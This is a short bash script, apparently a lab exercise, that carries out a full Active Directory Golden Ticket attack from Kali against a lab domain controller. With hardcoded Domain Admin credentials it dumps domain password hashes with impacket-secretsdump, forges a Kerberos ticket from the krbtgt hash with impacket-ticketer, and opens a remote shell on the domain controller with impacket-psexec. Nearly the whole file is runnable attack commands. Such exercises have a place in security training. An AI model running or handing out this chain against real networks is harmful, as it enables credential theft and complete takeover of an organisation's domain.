#!/usr/bin/env bash
# Exercise 6: dump krbtgt, forge a Golden Ticket, use it. Run from Kali.
# Requires Domain Admin creds already obtained. Fill in DOMAIN_SID from
# `impacket-secretsdump` output (or `Get-ADDomain` on the DC) before running.
set -euo pipefail

DC_IP="192.168.1.10"
DOMAIN="lab.local"
ADMIN_USER="Administrator"
ADMIN_PASS="Password123!"
DOMAIN_SID="S-1-5-21-XXXX"   # replace with real domain SID
KRBTGT_HASH="REPLACE_ME"      # replace with hash from secretsdump output below

impacket-secretsdump "$DOMAIN/$ADMIN_USER:$ADMIN_PASS@$DC_IP"

# Doc's original -domain-only form omits the required target username;
# impacket-ticketer needs one positional username arg (see -h).
impacket-ticketer -nthash "$KRBTGT_HASH" -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" "$ADMIN_USER"

export KRB5CCNAME="${ADMIN_USER}.ccache"
impacket-psexec "$DOMAIN/$ADMIN_USER@DC01.$DOMAIN" -k -no-pass
